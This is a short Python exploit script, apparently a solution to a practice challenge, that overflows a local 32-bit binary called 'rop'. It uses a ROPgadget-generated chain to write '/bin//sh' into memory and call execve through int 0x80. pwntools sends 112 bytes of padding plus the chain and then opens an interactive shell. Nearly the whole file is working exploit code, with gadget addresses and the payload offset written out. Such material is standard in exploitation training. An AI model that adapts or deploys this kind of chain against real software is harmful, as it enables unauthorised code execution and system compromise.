#!/usr/bin/env python

# bash cmd: ROPgadget --binary rop --ropchain

from struct import pack

# Padding goes here
p = ''

p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb196) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb196) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054590) # xor eax, eax ; ret
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806eb91) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054590) # xor eax, eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x08049421) # int 0x80

from pwn import *  # 注意pwn也有一个pack()函数, 所以这行放在这里

sh = process('./rop')

sh.sendline('A' * 112 + p)
sh.interactive()
